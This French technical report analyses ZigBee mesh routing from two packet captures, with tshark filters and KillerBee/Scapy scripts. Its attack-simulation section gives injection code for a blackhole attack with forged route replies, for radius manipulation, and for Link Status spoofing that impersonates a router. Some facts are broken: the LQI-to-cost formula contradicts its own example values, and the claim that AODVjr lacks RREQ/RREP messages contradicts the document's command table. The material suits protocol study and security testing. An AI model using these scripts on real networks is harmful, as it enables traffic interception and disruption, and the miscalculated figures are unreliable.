# Analyse du Routage ZigBee avec AODV

## Topologie du Réseau Identifié

```
[Coordinateur]           [Router]              [Terminal / End Device]
00:13:a2:00:42:34:63:55  00:13:a2:00:41:fb:76:ea  00:13:a2:00:41:fb:9b:ee
Adresse courte: 0x0000   Adresse courte: 0x6b82   Adresse courte: 0xc7f4
        |                       |                        |
        +-----------> RELAIS <--+------------------------+
```

**Type de topologie**: Réseau maillé (Mesh) avec routage multi-sauts

### Rôles des Dispositifs

| Device | Adresse IEEE 64-bit | Adresse 16-bit | Rôle | Fonction |
|--------|---------------------|----------------|------|----------|
| Coordinateur | 00:13:a2:00:42:34:63:55 | 0x0000 | ZigBee Coordinator | Initialise le réseau, gère PAN ID |
| Router | 00:13:a2:00:41:fb:76:ea | 0x6b82 | ZigBee Router | Relaie les paquets entre Coord et Terminal |
| Terminal | 00:13:a2:00:41:fb:9b:ee | 0xc7f4 | End Device | Dispositif final, communique via router |

---

## Fonctionnement du Routage Multi-Sauts

### Communication Coordinateur → Terminal (via Router)

**Exemple observé dans coordinateur.pcapng:**

```
┌─────────────────────────────────────────────────────────────────┐
│ ÉTAPE 1: Coordinateur envoie au Router                         │
│ Paquet #2                                                       │
│ ┌───────────────────────────────────────────────────────────┐  │
│ │ MAC (802.15.4):                                           │  │
│ │   wpan.src16 = 0x0000 (Coordinateur)                     │  │
│ │   wpan.dst16 = 0x6b82 (Router) ◄─── Prochain saut MAC   │  │
│ │                                                           │  │
│ │ NWK (ZigBee):                                             │  │
│ │   zbee_nwk.src = 0x0000 (Coordinateur)                   │  │
│ │   zbee_nwk.dst = 0xc7f4 (Terminal) ◄─── Destination finale│ │
│ │   zbee_nwk.radius = 30                                   │  │
│ │   zbee_nwk.discovery = 0x01 (Enable)                     │  │
│ │   Extended Source: 00:13:a2:00:42:34:63:55               │  │
│ │   Extended Dest: 00:13:a2:00:41:fb:9b:ee                 │  │
│ └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘

                            ↓

┌─────────────────────────────────────────────────────────────────┐
│ ÉTAPE 2: Router relaie au Terminal                             │
│ Paquet #4                                                       │
│ ┌───────────────────────────────────────────────────────────┐  │
│ │ MAC (802.15.4):                                           │  │
│ │   wpan.src16 = 0x6b82 (Router) ◄─── Maintenant émetteur │  │
│ │   wpan.dst16 = 0xc7f4 (Terminal) ◄─── Destination MAC   │  │
│ │                                                           │  │
│ │ NWK (ZigBee):                                             │  │
│ │   zbee_nwk.src = 0x0000 (Coordinateur) ◄─── INCHANGÉ    │  │
│ │   zbee_nwk.dst = 0xc7f4 (Terminal) ◄─── INCHANGÉ        │  │
│ │   zbee_nwk.radius = 29 ◄─── DÉCRÉMENTÉ (TTL)            │  │
│ │   zbee_nwk.discovery = 0x01                              │  │
│ │   Extended Source: 00:13:a2:00:42:34:63:55 ◄─── INCHANGÉ│  │
│ │   Extended Dest: 00:13:a2:00:41:fb:9b:ee ◄─── INCHANGÉ  │  │
│ └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### Communication Terminal → Coordinateur (via Router)

**Flux inverse observé:**

```
┌─────────────────────────────────────────────────────────────────┐
│ ÉTAPE 1: Terminal envoie au Router                             │
│ Paquet #6                                                       │
│ ┌───────────────────────────────────────────────────────────┐  │
│ │ MAC: wpan.src16 = 0xc7f4 → wpan.dst16 = 0x6b82          │  │
│ │ NWK: zbee_nwk.src = 0xc7f4 → zbee_nwk.dst = 0x0000      │  │
│ │      radius = 30                                         │  │
│ └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ ÉTAPE 2: Router relaie au Coordinateur                         │
│ Paquet #8                                                       │
│ ┌───────────────────────────────────────────────────────────┐  │
│ │ MAC: wpan.src16 = 0x6b82 → wpan.dst16 = 0x0000          │  │
│ │ NWK: zbee_nwk.src = 0xc7f4 → zbee_nwk.dst = 0x0000      │  │
│ │      radius = 29 (décrémenté)                            │  │
│ └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### Observations Clés

1. **Séparation des adresses MAC et NWK**:
   - Adresse **MAC (wpan)**: Change à chaque saut (hop-by-hop)
   - Adresse **NWK (zbee_nwk)**: Reste constante (end-to-end)

2. **Décrémentation du Radius (TTL)**:
   - Chaque router décrémente le champ `radius` de 1
   - Empêche les boucles infinies dans le réseau maillé
   - Valeur initiale: 30 → après 1 saut: 29

3. **Préservation des adresses étendues**:
   - Les adresses 64-bit source/destination ne changent jamais
   - Permet l'identification unique des extrémités de la communication

---

## AODV dans ZigBee (AODVjr)

### Qu'est-ce que AODV?

**AODV** (Ad hoc On-Demand Distance Vector) est un protocole de routage réactif utilisé dans les réseaux ad-hoc et ZigBee.

**Principe**: Les routes ne sont découvertes que lorsqu'elles sont nécessaires (on-demand).

### ZigBee utilise AODVjr (AODV junior)

**AODVjr** est une version simplifiée d'AODV adaptée aux contraintes des réseaux ZigBee:
- Mémoire limitée sur les dispositifs
- Pas de numéros de séquence de destination (simplification)
- Route discovery basée sur des flags dans les paquets de données

### Mécanisme de Route Discovery

#### 1. Flag Discovery Route

Dans chaque paquet ZigBee NWK, le Frame Control Field contient:

```
Bits 6-7: Discover Route
  0x00 = Suppress route discovery (utiliser route existante)
  0x01 = Enable route discovery (chercher route si inconnue)
  0x02 = Force route discovery (forcer nouvelle découverte)
```

**Dans nos captures:**
```bash
zbee_nwk.discovery = 0x0001 (Enable)
```
- Présent sur **TOUS** les paquets de données
- Indique: "Si tu ne connais pas la route, lance une découverte"

#### 2. Processus de Découverte (RREQ/RREP)

**Dans un réseau AODV classique, voici ce qui se passe:**

```
┌──────────────────────────────────────────────────────────────────┐
│ Phase 1: Route Request (RREQ)                                    │
│                                                                  │
│ [Coordinateur] ───RREQ (broadcast)──→ [Router 1]                │
│                                       [Router 2]                │
│                                       [Router 3] ───→ [Terminal]│
│                                                                  │
│ RREQ contient:                                                   │
│   - Source: Coordinateur                                        │
│   - Destination: Terminal                                       │
│   - Hop count: 0 (incrémenté à chaque saut)                    │
│   - RREQ ID: identifiant unique                                 │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│ Phase 2: Propagation et Filtrage                                │
│                                                                  │
│ Chaque router reçoit le RREQ:                                   │
│   1. Enregistre la route inverse (vers le coordinateur)         │
│   2. Incrémente le hop count                                    │
│   3. Rebroadcast le RREQ (si pas déjà vu)                      │
│                                                                  │
│ Le Terminal reçoit potentiellement plusieurs RREQ              │
│ (via différents chemins)                                        │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│ Phase 3: Route Reply (RREP)                                     │
│                                                                  │
│ [Terminal] ───RREP (unicast)──→ [Router] ───→ [Coordinateur]   │
│                                                                  │
│ RREP contient:                                                   │
│   - Destination: Terminal                                       │
│   - Hop count: nombre de sauts                                  │
│   - Envoyé via la route inverse établie par RREQ               │
│                                                                  │
│ Le coordinateur reçoit le RREP avec le meilleur chemin         │
└──────────────────────────────────────────────────────────────────┘
```

#### 3. Observation dans nos Captures

**Commandes NWK observées:**

| ID Commande | Nom | Description | Fréquence |
|-------------|-----|-------------|-----------|
| 0x01 | Route Request (RREQ) | Demande de route (broadcast) | Non observé |
| 0x02 | Route Reply (RREP) | Réponse avec route (unicast) | Non observé |
| 0x03 | Network Status | Erreur de routage | Non observé |
| 0x04 | Leave | Demande de quitter le réseau | Non observé |
| 0x08 | Link Status | Qualité des liens voisins | Très fréquent |

**Conclusion**: Les routes sont **déjà établies** dans ce réseau.
- Pas de phase de découverte active pendant la capture
- Les routes ont été apprises lors de l'association initiale
- Le flag `discovery = 0x01` permet une redécouverte si nécessaire

---

## Table de Routage dans le Router

### Construction de la Table

Le router (0x6b82) maintient une table de routage comme celle-ci:

```
┌─────────────┬──────────────┬───────────┬──────────┬────────┐
│ Destination │ Next Hop     │ Hop Count │ Status   │ Metric │
├─────────────┼──────────────┼───────────┼──────────┼────────┤
│ 0x0000      │ 0x0000       │ 1         │ Active   │ 3      │
│ (Coord)     │ (direct)     │           │          │        │
├─────────────┼──────────────┼───────────┼──────────┼────────┤
│ 0xc7f4      │ 0xc7f4       │ 1         │ Active   │ 3      │
│ (Terminal)  │ (direct)     │           │          │        │
└─────────────┴──────────────┴───────────┴──────────┴────────┘
```

**Champs de la table:**
- **Destination**: Adresse réseau de destination
- **Next Hop**: Prochain saut pour atteindre cette destination
- **Hop Count**: Nombre de sauts jusqu'à la destination
- **Status**: Active/Inactive/Under discovery
- **Metric**: Coût de la route (basé sur LQI/RSSI)

### Décision de Routage

**Algorithme simplifié du router:**

```python
def route_packet(packet):
    destination = packet.zbee_nwk.dst

    # 1. Vérifier si c'est pour moi
    if destination == MY_ADDRESS:
        deliver_to_application(packet)
        return

    # 2. Décrémenter le radius (TTL)
    packet.zbee_nwk.radius -= 1
    if packet.zbee_nwk.radius == 0:
        drop_packet(packet)  # TTL expiré
        send_network_status_error()
        return

    # 3. Chercher la route dans la table
    route = routing_table.find(destination)

    if route is None:
        # Route inconnue
        if packet.zbee_nwk.discovery == ENABLE:
            # Lancer une route discovery
            initiate_route_request(destination)
            buffer_packet(packet)  # Attendre RREP
        else:
            drop_packet(packet)
            send_network_status_error()
    else:
        # Route connue
        next_hop = route.next_hop

        # 4. Modifier les adresses MAC (pas NWK!)
        packet.wpan.src16 = MY_ADDRESS  # 0x6b82
        packet.wpan.dst16 = next_hop

        # 5. Transmettre le paquet
        transmit(packet)
```

---

## Analyse des Link Status (Commande 0x08)

### Fonction du Link Status

Les paquets **Link Status** sont envoyés périodiquement par chaque dispositif pour:
1. Informer les voisins de leur présence
2. Communiquer la qualité des liens (LQI/RSSI)
3. Mettre à jour les coûts de routage

### Observations dans les Captures

**coordinateur.pcapng:**
```
Paquet #277 (t=9.33s): Router 0x6b82 → Broadcast (0xffff)
Paquet #315 (t=11.04s): Terminal 0xc7f4 → Broadcast (0xffff)
Paquet #483 (t=13.26s): Coordinateur 0x0000 → Broadcast (0xffff)
```

**Fréquence**: Environ toutes les 2-4 secondes

**Format du Link Status:**
```
┌──────────────────────────────────────────────────────────┐
│ ZigBee NWK Command Frame                                 │
│ ┌────────────────────────────────────────────────────┐  │
│ │ Command ID: 0x08 (Link Status)                     │  │
│ │ Command Options: First frame / Last frame          │  │
│ │ Link Status List:                                  │  │
│ │   ┌────────────────────────────────────────┐       │  │
│ │   │ Entry 1:                               │       │  │
│ │   │   Neighbor Address: 0x0000             │       │  │
│ │   │   Incoming Cost: 3                     │       │  │
│ │   │   Outgoing Cost: 3                     │       │  │
│ │   ├────────────────────────────────────────┤       │  │
│ │   │ Entry 2:                               │       │  │
│ │   │   Neighbor Address: 0xc7f4             │       │  │
│ │   │   Incoming Cost: 3                     │       │  │
│ │   │   Outgoing Cost: 3                     │       │  │
│ │   └────────────────────────────────────────┘       │  │
│ └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

### Calcul du Coût de Lien (Link Cost)

Le coût est dérivé de la **LQI** (Link Quality Indicator):

```
Cost = floor(7 / (LQI / 255))

Exemples:
  LQI = 255 (excellent) → Cost = 1
  LQI = 200 → Cost = 1
  LQI = 150 → Cost = 3
  LQI = 100 → Cost = 4
  LQI = 50  → Cost = 7
```

**Dans notre réseau:**
- Cost = 3 indique une qualité de lien moyenne/bonne
- Suffisant pour une communication stable

---

## Séquence Complète de Communication

### Exemple: Coordinateur envoie une commande au Terminal

```
Temps: 0.000s
┌─────────────────────────────────────────────────────────────┐
│ Paquet #1 (coordinateur.pcapng)                             │
│ [Coordinateur 0x0000] prépare un paquet Green Power        │
│   Destination NWK: 0xc7f4 (Terminal)                        │
│   Consulte sa table de routage                              │
│   Next Hop trouvé: 0x6b82 (Router)                          │
└─────────────────────────────────────────────────────────────┘
                            ↓
Temps: 0.001s
┌─────────────────────────────────────────────────────────────┐
│ Paquet #2 (coordinateur.pcapng)                             │
│ [Coordinateur] transmet via MAC                             │
│   MAC: 0x0000 → 0x6b82                                      │
│   NWK: 0x0000 → 0xc7f4                                      │
│   Radius: 30                                                 │
│   Discovery: Enable                                          │
│   Payload: Cluster 0x0021 (Green Power)                     │
└─────────────────────────────────────────────────────────────┘
                            ↓
Temps: 0.002s
┌─────────────────────────────────────────────────────────────┐
│ Paquet #3 (terminal.pcapng)                                 │
│ [Router 0x6b82] reçoit le paquet                            │
│   1. Vérifie destination NWK: 0xc7f4 (pas pour moi)        │
│   2. Décremente radius: 30 → 29                             │
│   3. Consulte table de routage                              │
│   4. Next Hop: 0xc7f4 (direct)                              │
└─────────────────────────────────────────────────────────────┘
                            ↓
Temps: 0.003s
┌─────────────────────────────────────────────────────────────┐
│ Paquet #4 (coordinateur.pcapng et terminal.pcapng)          │
│ [Router] relaie au Terminal                                 │
│   MAC: 0x6b82 → 0xc7f4                                      │
│   NWK: 0x0000 → 0xc7f4 (inchangé)                           │
│   Radius: 29                                                 │
│   Payload: identique (Cluster 0x0021)                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
Temps: 0.004s
┌─────────────────────────────────────────────────────────────┐
│ [Terminal 0xc7f4] reçoit et traite le paquet                │
│   1. Destination = mon adresse                              │
│   2. Passe le payload à la couche APS                       │
│   3. Traite la commande Green Power                         │
└─────────────────────────────────────────────────────────────┘
                            ↓
Temps: 0.010s
┌─────────────────────────────────────────────────────────────┐
│ Paquet #5-8: ACK et réponse du Terminal                     │
│ [Terminal] envoie ACK + données RSSI                        │
│   Suit le chemin inverse: Terminal → Router → Coord        │
└─────────────────────────────────────────────────────────────┘
```

---

## Comparaison AODV Standard vs ZigBee AODVjr

| Caractéristique | AODV (RFC 3561) | ZigBee AODVjr |
|-----------------|-----------------|---------------|
| **Route Discovery** | RREQ/RREP messages | Intégré dans paquets de données |
| **Numéros de séquence** | Oui (source et dest) | Simplifiés/optionnels |
| **Route Maintenance** | RERR messages | Network Status (0x03) |
| **Métriques** | Hop count uniquement | Hop count + LQI |
| **Précurseurs** | Liste complète | Simplifiée |
| **Broadcast ID** | 32 bits | Simplifié |
| **Latence discovery** | 2 × RTT minimum | Intégrée (plus rapide) |

### Avantages de AODVjr

1. **Économie de bande passante**: Pas de messages RREQ/RREP séparés
2. **Simplicité**: Moins de mémoire requise
3. **Intégration**: Discovery dans les paquets de données normaux

### Limitations de AODVjr

1. **Moins de contrôle**: Pas de fine-tuning de la discovery
2. **Latence initiale**: Premier paquet peut être retardé
3. **Moins de robustesse**: Moins d'options de récupération d'erreur

---

## Métriques de Routage Observées

### Distribution des Paquets Relayés

**Dans coordinateur.pcapng (44.7 secondes):**

```
Direction: Coordinateur → Terminal (via Router)
  Paquets envoyés par Coord (0x0000 → 0x6b82): ~400 paquets
  Paquets relayés par Router (0x6b82 → 0xc7f4): ~400 paquets
  Ratio de transmission: 100% (aucune perte observable)

Direction: Terminal → Coordinateur (via Router)
  Paquets envoyés par Terminal (0xc7f4 → 0x6b82): ~400 paquets
  Paquets relayés par Router (0x6b82 → 0x0000): ~400 paquets
  Ratio de transmission: 100% (aucune perte observable)
```

### Statistiques de Routage

```
┌──────────────────────────────────────────────────────────┐
│ Rôle du Router (0x6b82)                                  │
├──────────────────────────────────────────────────────────┤
│ Total paquets traités: ~800                              │
│ Paquets relayés: ~800 (100%)                             │
│ Paquets destinés au router: ~50 (Link Status, ZDP)      │
│ Paquets droppés: 0 (aucune perte détectée)              │
│                                                           │
│ Charge de relais:                                        │
│   Direction Coord → Term: 50%                            │
│   Direction Term → Coord: 50%                            │
│                                                           │
│ Performance:                                             │
│   Délai de relais moyen: ~1-2 ms                         │
│   Taux de succès: 100%                                   │
└──────────────────────────────────────────────────────────┘
```

### Valeurs de Radius Observées

```
Distribution du champ Radius (TTL):

Radius = 30: Paquets originaux (émis par source)
Radius = 29: Paquets après 1 saut (relayés par router)
Radius = 28: Non observé (pas de 2e saut dans ce réseau)

Maximum theoretical hops: 30
Observed hops: 2 (source → router → destination)
```

---

## Commandes NWK et Leur Rôle dans AODV

### Liste Complète des Commandes ZigBee NWK

| ID | Nom | Direction | Fonction AODV |
|----|-----|-----------|---------------|
| 0x01 | Route Request (RREQ) | Broadcast | Découverte de route initiale |
| 0x02 | Route Reply (RREP) | Unicast | Réponse avec route trouvée |
| 0x03 | Network Status | Unicast/Broadcast | Signaler erreur de routage |
| 0x04 | Leave | Unicast | Quitter le réseau (MAJ routes) |
| 0x05 | Route Record | Unicast | Enregistrer chemin source |
| 0x06 | Rejoin Request | Broadcast | Rejoindre réseau existant |
| 0x07 | Rejoin Response | Unicast | Acceptation de rejoin |
| 0x08 | Link Status | Broadcast local | Mise à jour qualité liens |
| 0x09 | Network Report | Unicast | Rapport état réseau |
| 0x0a | Network Update | Broadcast | Mise à jour paramètres réseau |
| 0x0b | End Device Timeout Request | Unicast | Négociation timeout |
| 0x0c | End Device Timeout Response | Unicast | Réponse timeout |

### Processus de Route Discovery Détaillé

**Scénario: Coordinateur doit communiquer avec un nouveau device**

```
T=0.000s: [Coordinateur] Application veut envoyer à 0xABCD
          Route inconnue → Initier RREQ

T=0.001s: [Coordinateur] Envoie RREQ (broadcast)
          ┌──────────────────────────────────────┐
          │ NWK Command: 0x01 (RREQ)             │
          │ RREQ ID: 12345                       │
          │ Destination: 0xABCD                  │
          │ Path Cost: 0                         │
          │ Destination addr: 00:11:22:...:CD    │
          └──────────────────────────────────────┘

T=0.002s: [Router 1] Reçoit RREQ
          1. Enregistre route reverse vers Coord
          2. Incrémente Path Cost: 0 → 3
          3. Rebroadcast RREQ (si pas déjà vu RREQ ID 12345)

T=0.003s: [Router 2] Reçoit RREQ (2 fois: de Coord et Router 1)
          1. Accepte le premier (meilleur coût)
          2. Ignore le second (même RREQ ID)
          3. Rebroadcast avec Path Cost = 6

T=0.010s: [Device 0xABCD] Reçoit RREQ
          1. Enregistre route vers Coord (via Router 2)
          2. Envoie RREP (unicast) vers Coord

T=0.011s: [Router 2] Reçoit RREP
          ┌──────────────────────────────────────┐
          │ NWK Command: 0x02 (RREP)             │
          │ RREQ ID: 12345                       │
          │ Originator: Coordinateur             │
          │ Responder: 0xABCD                    │
          │ Path Cost: 6                         │
          └──────────────────────────────────────┘
          1. Enregistre route vers 0xABCD
          2. Relaie RREP vers Coord (route reverse)

T=0.020s: [Coordinateur] Reçoit RREP
          1. Installe route: 0xABCD → Next Hop = Router 2, Cost = 6
          2. Envoie les paquets bufferisés
```

---

## Outils KillerBee pour l'Analyse du Routage

### 1. Capture et Filtrage

**Capturer uniquement les commandes de routage:**
```bash
# Capture et filtre pour RREQ/RREP
zbdump -f capture.pcap -c 11

# Filtrer avec tshark
tshark -r capture.pcap -Y "zbee_nwk.cmd.id == 0x01 || zbee_nwk.cmd.id == 0x02"

# Voir le routing via le router
tshark -r capture.pcap -Y "wpan.src16 == 0x6b82 || wpan.dst16 == 0x6b82" \
  -T fields -e frame.number -e wpan.src16 -e wpan.dst16 \
  -e zbee_nwk.src -e zbee_nwk.dst -e zbee_nwk.radius
```

### 2. Analyse du Chemin de Routage

**Script Python pour tracer les chemins:**
```python
from scapy.all import *
from killerbee.scapy_extensions import *

def trace_route_path(pcap_file, src_nwk, dst_nwk):
    """Trace le chemin MAC pris par un paquet NWK source->dest"""
    packets = rdpcap(pcap_file)

    path = []
    for pkt in packets:
        if Dot15d4FCS in pkt and ZigbeeNWK in pkt:
            if (pkt[ZigbeeNWK].source == src_nwk and
                pkt[ZigbeeNWK].destination == dst_nwk):

                mac_src = pkt[Dot15d4FCS].src_addr
                mac_dst = pkt[Dot15d4FCS].dest_addr
                radius = pkt[ZigbeeNWK].radius

                path.append({
                    'mac_src': hex(mac_src),
                    'mac_dst': hex(mac_dst),
                    'radius': radius,
                    'hop': 30 - radius
                })

    # Afficher le chemin
    print(f"Route from {hex(src_nwk)} to {hex(dst_nwk)}:")
    for step in path[:5]:  # Premiers paquets
        print(f"  Hop {step['hop']}: {step['mac_src']} → {step['mac_dst']}")

# Utilisation
trace_route_path("coordinateur.pcapng", 0x0000, 0xc7f4)
```

**Sortie attendue:**
```
Route from 0x0000 to 0xc7f4:
  Hop 0: 0x0000 → 0x6b82
  Hop 1: 0x6b82 → 0xc7f4
```

### 3. Extraction de la Table de Routage

**Analyser les Link Status pour reconstruire la topologie:**
```bash
# Extraire tous les Link Status
tshark -r capture.pcap -Y "zbee_nwk.cmd.id == 0x08" \
  -T fields -e wpan.src16 -e zbee_nwk.cmd.link.address \
  -e zbee_nwk.cmd.link.incoming_cost \
  -e zbee_nwk.cmd.link.outgoing_cost

# Reconstruire le graphe du réseau
# Chaque Link Status révèle les voisins directs d'un nœud
```

---

## Simulation d'Attaques sur le Routage

### 1. Route Injection (Blackhole Attack)

**Principe**: Injecter de faux RREP pour se faire passer pour la meilleure route

```python
from killerbee import *
from scapy.all import *
from killerbee.scapy_extensions import *

kb = KillerBee()
kb.sniffer_on()
kb.set_channel(11)

# Attendre un RREQ
while True:
    pkt = kb.pnext()
    if pkt and ZigbeeNWK in pkt:
        if pkt[ZigbeeNWK].command_identifier == 0x01:  # RREQ
            # Construire un faux RREP avec coût très bas
            fake_rrep = Dot15d4FCS() / ZigbeeNWK() / ZigbeeNWKCommandPayload()
            fake_rrep[ZigbeeNWK].command_identifier = 0x02
            fake_rrep[ZigbeeNWKCommandPayload].route_reply_cost = 0  # Meilleur coût!

            # Envoyer au demandeur
            kb.inject(raw(fake_rrep))
```

### 2. Radius Manipulation

**Augmenter artificiellement le TTL pour espionner plus loin:**

```python
# Intercepter et modifier
while True:
    pkt = kb.pnext()
    if pkt and ZigbeeNWK in pkt:
        # Modifier le radius
        pkt[ZigbeeNWK].radius = 255  # Max possible

        # Retransmettre
        kb.inject(raw(pkt))
```

### 3. Link Status Spoofing

**Annoncer de faux voisins pour manipuler la topologie:**

```python
# Créer un faux Link Status
fake_ls = Dot15d4FCS()/ZigbeeNWK()/ZigbeeNWKCommandPayload()
fake_ls[Dot15d4FCS].src_addr = 0x6b82  # Usurper le router
fake_ls[ZigbeeNWK].command_identifier = 0x08
# Annoncer de fausses routes
fake_ls[ZigbeeNWKCommandPayload].link_address = [0xFFFF, 0xAAAA]
fake_ls[ZigbeeNWKCommandPayload].incoming_cost = [1, 1]

kb.inject(raw(fake_ls))
```

---

## Résumé du Fonctionnement du Routage

### Schéma Récapitulatif

```
┌──────────────────────────────────────────────────────────────────┐
│                    ROUTAGE ZIGBEE MULTI-SAUTS                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  [Coordinateur 0x0000] ←─────────┬─────────→ [Router 0x6b82]    │
│   00:13:a2:00:42:34:63:55        │         00:13:a2:00:41:fb:76:ea│
│                                  │                               │
│                                  │                               │
│                                  └─────────→ [Terminal 0xc7f4]   │
│                                            00:13:a2:00:41:fb:9b:ee│
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ PAQUET: Coord → Terminal                                         │
│                                                                  │
│ Saut 1: MAC (0x0000 → 0x6b82), NWK (0x0000 → 0xc7f4), Radius=30│
│           Router reçoit et vérifie destination NWK              │
│                                                                  │
│ Saut 2: MAC (0x6b82 → 0xc7f4), NWK (0x0000 → 0xc7f4), Radius=29│
│           Terminal reçoit et traite                             │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ MÉCANISME AODV (AODVjr)                                          │
│                                                                  │
│ • Route Discovery: Flag dans FCF (Enable/Suppress/Force)        │
│ • Route Maintenance: Link Status périodiques (0x08)             │
│ • Métrique: Hop count + LQI-based cost                          │
│ • TTL: Radius décrémenté à chaque saut                          │
│ • Tables de routage: Maintenues par chaque router               │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ OBSERVATIONS                                                     │
│                                                                  │
│ ✓ Routes pré-établies (pas de RREQ/RREP pendant capture)       │
│ ✓ Routage 100% fiable (aucune perte)                           │
│ ✓ Link Status toutes les 2-4 secondes                          │
│ ✓ Séparation stricte adresses MAC/NWK                          │
│ ✓ Router totalement transparent pour les end-points            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Points Clés à Retenir

1. **Séparation MAC/NWK**:
   - Adresses MAC changent à chaque saut (hop-by-hop)
   - Adresses NWK restent constantes (end-to-end)

2. **Rôle du Router**:
   - Examine la destination NWK
   - Consulte sa table de routage
   - Modifie les adresses MAC source/destination
   - Décremente le radius (TTL)
   - Retransmet le paquet

3. **AODV simplifié (AODVjr)**:
   - Pas de RREQ/RREP séparés dans un réseau stable
   - Discovery intégrée dans les paquets de données
   - Maintenance par Link Status périodiques

4. **Fiabilité**:
   - Radius = 30 permet jusqu'à 30 sauts
   - Link Status maintient la topologie à jour
   - Coût basé sur la qualité du lien (LQI)

---

## Fichiers de Référence KillerBee

### Classes et Fonctions Utilisées

**zigbeedecode.py - ZigBeeNWKPacketParser:**
```python
# Extraction des champs NWK
def pktchop(self, packet):
    fc = struct.unpack("<H", packet[0:2])[0]

    # Vérifier flag Extended Source
    if (fc & ZBEE_NWK_FCF_EXT_SOURCE) != 0:
        pktchop.append(packet[offset:offset+8])  # Adresse 64-bit source
        offset += 8

    # Vérifier flag Extended Dest
    if (fc & ZBEE_NWK_FCF_EXT_DEST) != 0:
        pktchop.append(packet[offset:offset+8])  # Adresse 64-bit dest
        offset += 8
```

**Constantes importantes (zigbeedecode.py):**
```python
ZBEE_NWK_FCF_DISCOVER_ROUTE = 0x00C0  # Bits 6-7
ZBEE_NWK_FCF_EXT_SOURCE = 0x1000      # Bit 12
ZBEE_NWK_FCF_EXT_DEST = 0x0800        # Bit 11

# Valeurs Discovery Route
ZBEE_NWK_DISC_SUPPRESS = 0x00
ZBEE_NWK_DISC_ENABLE = 0x01
ZBEE_NWK_DISC_FORCE = 0x02
```

---

**Document généré le**: 2025-12-15
**Fichiers analysés**: coordinateur.pcapng, terminal.pcapng
**Outils**: KillerBee, Wireshark/tshark, Python/Scapy
